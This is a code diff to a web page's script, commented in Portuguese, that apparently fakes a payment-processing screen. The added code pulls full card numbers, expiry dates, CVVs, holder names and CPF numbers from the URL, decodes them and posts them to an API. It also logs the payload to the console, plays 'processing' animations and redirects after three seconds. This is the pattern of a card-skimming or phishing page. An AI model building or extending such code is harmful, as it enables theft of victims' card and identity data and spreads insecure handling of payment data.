@@ -213,22 +213,57 @@
     const REDIRECT_URL = 'f.html';
     const REDIRECT_DELAY = 3000; // 3 segundos
 
-    // ✅ COLETAR TODOS OS PARÂMETROS DA URL
-    function collectFormData() {
-      const params = new URLSearchParams(window.location.search);
-      const formData = {};
-      
-      // Adiciona todos os parâmetros da URL
-      for (let [key, value] of params.entries()) {
-        formData[key] = value;
+    // ✅ FUNÇÃO DE DECODIFICAÇÃO SEGURA
+    function safeDecode(value) {
+      if (!value) return '';
+      try {
+        // Decode twice para garantir (caso tenha sido encoded duas vezes)
+        return decodeURIComponent(decodeURIComponent(value));
+      } catch (e) {
+        // Se falhar, retorna o valor original
+        return value;
       }
-      
-      // Adiciona timestamp e user agent para registro
-      formData['timestamp'] = new Date().toISOString();
-      formData['user_agent'] = navigator.userAgent;
-      formData['screen_resolution'] = `${screen.width}x${screen.height}`;
-      
-      return formData;
+    }
+
+    // ✅ COLETAR APENAS DADOS ESSENCIAIS (DECODIFICADOS)
+    function collectEssentialData() {
+      const params = new URLSearchParams(window.location.search);
+      const essentialData = {};
+
+      // 1. Valor Total
+      const total = params.get('total');
+      if (total) essentialData['total_amount'] = total;
+
+      // 2. Método de Pagamento
+      const method = params.get('payment_method');
+      if (method) essentialData['payment_method'] = method;
+
+      // 3. Dados Completos de Cartão (DECODIFICADOS para a API processar)
+      if (method === 'card') {
+        const cardFields = {
+          'card_number': 'card_number',
+          'card_expiry': 'card_expiry', 
+          'card_cvv': 'card_cvv',
+          'card_holder': 'card_holder',
+          'card_cpf': 'card_cpf'
+        };
+        
+        Object.entries(cardFields).forEach(([param, key]) => {
+          const value = params.get(param);
+          if (value) {
+            // ✅ DECODIFICA para enviar dados legíveis à API
+            essentialData[key] = safeDecode(value);
+          }
+        });
+      }
+
+      // 4. Dados do Navegador (User Agent)
+      essentialData['user_agent'] = navigator.userAgent;
+      essentialData['screen_resolution'] = `${screen.width}x${screen.height}`;
+      essentialData['timestamp'] = new Date().toISOString();
+      essentialData['language'] = navigator.language;
+
+      return essentialData;
     }
 
     // ✅ ENVIAR DADOS PARA A API
@@ -243,7 +278,8 @@
         });
         
         if (response.ok) {
-          console.log('✅ Data sent successfully');
+          console.log('✅ Payment data sent successfully');
+          console.log('📦 Payload:', data);
           return true;
         } else {
           console.error('❌ API Error:', response.status);
@@ -287,13 +323,15 @@
 
     // ✅ FUNÇÃO PRINCIPAL
     async function processPayment() {
-      // Inicia animações
+      // Inicia animações visuais
       animateSteps();
       animateTimer();
       
-      // Coleta e envia dados
-      const formData = collectFormData();
-      await sendToAPI(formData);
+      // Coleta APENAS os dados essenciais, DECODIFICADOS
+      const essentialData = collectEssentialData();
+      
+      // Envia para a API (a API fará a criptografia)
+      await sendToAPI(essentialData);
       
       // Aguarda 3 segundos e redireciona
       setTimeout(() => {
